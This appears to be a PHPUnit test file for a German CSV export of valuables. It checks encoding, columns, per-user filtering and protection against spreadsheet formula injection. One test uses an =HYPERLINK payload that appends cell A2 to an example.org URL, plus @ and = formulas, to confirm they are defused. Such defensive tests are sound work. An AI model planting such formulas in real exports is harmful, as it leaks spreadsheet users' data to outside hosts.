<?php

namespace Tests;

/**
 * Allgemeiner CSV-Export (export_csv.php; Laden und Schreiben seit 4.6 in
 * helpers_csv.php).
 *
 * Bis 4.5.2 hatte dieser Export keinen Formelschutz (OWASP-A05-003), bis
 * 4.3.32 galt "nur eigene" nicht und das Export-Recht wurde nicht geprueft.
 * Geprueft wird die Datei, wie sie beim Benutzer ankommt: BOM, Tabulator
 * als Trennzeichen, deutsche Kopfzeile, Umlaute, Formate.
 */
class CsvExportTest extends GeschaeftskernTestCase
{
    private const KOPF = ['ID', 'Name', 'Raum', 'Kategorie', 'Kaufdatum', 'Preis (EUR)', 'Notizen',
                          'Bild', 'Erstellt von', 'Hier gelistet am', 'Erstellt am',
                          'Seriennummer', 'Hersteller', 'Modell', 'Zustand', 'Garantie bis'];

    protected function setUp(): void
    {
        parent::setUp();
        $GLOBALS['translations'] = require __DIR__ . '/../lang/de.php';
        $this->anmelden('admin');
    }

    protected function tearDown(): void
    {
        unset($GLOBALS['translations']);
        parent::tearDown();
    }

    /** Exportiert wie export_csv.php und liefert die rohe Datei. */
    private function export(): string
    {
        [$ownSql, $ownParams] = nurEigeneSql('w');
        $datei = fopen('php://memory', 'w+');
        vsCsvExportSchreiben($datei, vsCsvExportLaden($this->db, $ownSql, $ownParams));
        rewind($datei);
        $inhalt = stream_get_contents($datei);
        fclose($datei);
        return $inhalt;
    }

    /** Zeilen der Datei, gelesen mit denselben Zeichen, mit denen sie geschrieben wurde. */
    private function zeilen(string $inhalt): array
    {
        $inhalt = substr($inhalt, 3);   // BOM
        $zeilen = [];
        foreach (explode("\n", rtrim($inhalt, "\n")) as $zeile) {
            $zeilen[] = str_getcsv($zeile, "\t", '"', '\\');
        }
        return $zeilen;
    }

    /** Zeile eines Gegenstands nach Name (Spalte 2). */
    private function zeileVon(array $zeilen, string $name): array
    {
        foreach ($zeilen as $z) {
            if (($z[1] ?? null) === $name) return $z;
        }
        $this->fail("$name fehlt im Export");
    }

    public function testKopfzeileUndSpalten(): void
    {
        $inhalt = $this->export();
        $this->assertStringStartsWith("\xEF\xBB\xBF", $inhalt, 'BOM fuer Excel');

        $zeilen = $this->zeilen($inhalt);
        $this->assertSame(self::KOPF, $zeilen[0]);
        $this->assertCount(8, $zeilen, 'Kopf + 7 Gegenstaende (auch verborgene)');
        foreach ($zeilen as $z) {
            $this->assertCount(16, $z);
        }
        // Sortiert nach Name
        $this->assertSame(['Bild', 'Fernseher', 'Kamera', 'Kette', 'Laptop', 'Ring', 'Uhr'], array_column(array_slice($zeilen, 1), 1));
    }

    public function testWerteUndFormate(): void
    {
        $zeilen = $this->zeilen($this->export());

        $ring = $this->zeileVon($zeilen, 'Ring');
        $this->assertSame(['1', 'Ring', 'Wohnzimmer', 'Schmuck', '01.03.2025', '500,00 €', 'Erbstück',
                           '', 'lea', '02.03.2025', '02.03.2025 10:15', '', '', '', '', '-'], $ring);

        // Fehlende Angaben: Datum "-", leerer Raum/Kategorie, Preis 0 bleibt 0
        $kette = $this->zeileVon($zeilen, 'Kette');
        $this->assertSame('', $kette[2]);
        $this->assertSame('-', $kette[4]);
        $this->assertSame('0,00 €', $kette[5]);
        $this->assertSame('-', $kette[10]);
        $this->assertSame('', $this->zeileVon($zeilen, 'Bild')[8], 'ohne Ersteller');
        $this->assertSame('uhr.jpg', $this->zeileVon($zeilen, 'Uhr')[7]);

        // 4.8: Seriennummer, Hersteller, Modell, Zustand (uebersetzt) hinten
        $this->pdo->exec("UPDATE wertsachen SET seriennummer = 'SN-1', hersteller = 'Yamaha',
                          modell = 'C3X', erhaltungszustand = 'sehr_gut' WHERE id = 1");
        $ring2 = $this->zeileVon($this->zeilen($this->export()), 'Ring');
        $this->assertSame(['SN-1', 'Yamaha', 'C3X', 'Sehr gut', '-'], array_slice($ring2, 11));

        // 4.8: Garantie bis (Migration 017) ganz hinten
        $this->pdo->exec("UPDATE wertsachen SET garantie_bis = '2027-03-01' WHERE id = 1");
        $this->assertSame('01.03.2027', $this->zeileVon($this->zeilen($this->export()), 'Ring')[15]);

        // Zeitwert steht nicht im CSV (nur Kaufpreis)
        $this->assertNotContains('650,00 €', $ring);
    }

    public function testUmlauteBleibenErhalten(): void
    {
        $this->pdo->exec("UPDATE wertsachen SET name = 'Ölgemälde „Straße“', notizen = 'Größe 40×60 – Rahmen' WHERE id = 3");
        $inhalt = $this->export();

        $this->assertTrue(mb_check_encoding($inhalt, 'UTF-8'));
        $zeile = $this->zeileVon($this->zeilen($inhalt), 'Ölgemälde „Straße“');
        $this->assertSame('Büro', $zeile[2]);
        $this->assertSame('Größe 40×60 – Rahmen', $zeile[6]);
    }

    public function testFormelnWerdenEntschaerft(): void
    {
        $this->pdo->exec("UPDATE wertsachen SET name = '=HYPERLINK(\"https://example.org/?\"&A2;\"Rechnung\")',
                                               notizen = '+49 30 123456' WHERE id = 1");
        $this->pdo->exec("UPDATE wertsachen SET name = '@SUMME(A1)', notizen = '-' WHERE id = 2");
        $this->pdo->exec("UPDATE wertsachen SET notizen = '\t=1+1' WHERE id = 3");
        $zeilen = $this->zeilen($this->export());

        $ring = $zeilen[array_search('1', array_column($zeilen, 0), true)];
        $this->assertSame('\'=HYPERLINK("https://example.org/?"&A2;"Rechnung")', $ring[1]);
        $this->assertSame("'+49 30 123456", $ring[6]);

        $uhr = $zeilen[array_search('2', array_column($zeilen, 0), true)];
        $this->assertSame("'@SUMME(A1)", $uhr[1]);
        $this->assertSame('-', $uhr[6], 'Platzhalter "-" bleibt');

        $this->assertSame("'\t=1+1", $this->zeileVon($zeilen, 'Laptop')[6]);

        // Zahlen bleiben Zahlen, normaler Text bleibt unveraendert
        $this->assertSame('-12.5', vsCsvFormelSchutz('-12.5'));
        $this->assertSame('+3', vsCsvFormelSchutz('+3'));
        $this->assertSame('Ring', vsCsvFormelSchutz('Ring'));
        $this->assertSame('', vsCsvFormelSchutz(null));
    }

    public function testLeserExportiertNurEigene(): void
    {
        $this->anmelden('lea');
        $namen = array_column(array_slice($this->zeilen($this->export()), 1), 1);
        $this->assertSame(['Kette', 'Laptop', 'Ring'], $namen);
    }

    /**
     * Bis 4.6 (FUND-06) schrieb fputcsv() mit Escape-Zeichen '\\': ein
     * Anfuehrungszeichen nach einem Rueckstrich wurde nicht verdoppelt.
     * Excel und LibreOffice lesen nach RFC 4180 (ohne Escape-Zeichen) - dort
     * zerfiel die Zelle. Gelesen wird hier deshalb wie Excel.
     */
    public function testRueckstrichVorAnfuehrungszeichenUeberstehtExcel(): void
    {
        $notiz = 'Ordner C:\\"Belege"';
        $this->pdo->exec("UPDATE wertsachen SET notizen = " . $this->pdo->quote($notiz) . " WHERE id = 1");
        $inhalt = substr($this->export(), 3);

        $ringZeile = null;
        foreach (explode("\n", $inhalt) as $z) {
            if (str_starts_with($z, "1\t")) $ringZeile = $z;
        }
        $wieExcel = str_getcsv($ringZeile, "\t", '"', '');
        $this->assertSame($notiz, $wieExcel[6]);
        $this->assertCount(16, $wieExcel, 'keine verrutschten Spalten');
    }
}
